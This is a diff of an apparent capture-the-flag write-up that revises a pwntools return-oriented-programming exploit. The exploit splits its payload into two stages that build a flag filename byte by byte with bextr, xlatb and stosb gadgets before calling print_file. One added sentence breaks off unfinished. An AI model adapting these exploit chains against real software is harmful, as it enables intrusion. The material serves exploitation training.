@@ -13,6 +13,8 @@ bextr rdx,rcx,rbx let us provide rbx an arbitary value, while xlat let us manipu
 
 all left to do is find every single byte we need in the binary to craft the flag address, one byte at a time. How rigorous!
 
+also be careful, as the rop chain is sup
+
 ```
 #!/usr/bin/env python3
 
@@ -26,6 +28,7 @@ context.log_level = "debug"
 script = '''
 b*pwnme+150
 c
+b*questionableGadgets+17
 '''
 
 def main():
@@ -100,10 +103,19 @@ def main():
         pop_rdi,
         0x601806,
         stosb_byte_IrdiI_al,
-        
+
+        exe.sym["pwnme"]
+    )
+
+    r.recvuntil("> ")
+    r.send(payload)
+
+    payload=flat(
+        buf,
+
         pop_rdx_pop_rcx_add3ef2_rcx_bextr_rbx_rcx_rdx,
         0x4000,
-        flag[7]-0x3ef2-val[6],
+        flag[7]-0x3ef2-0xb,
         xlatb,
         pop_rdi,
         0x601807,
@@ -130,7 +142,7 @@ def main():
         exe.plt["print_file"]
     )
 
-    time.sleep(0.1)
+    r.recvuntil("> ")
     r.send(payload)
 
     r.interactive()
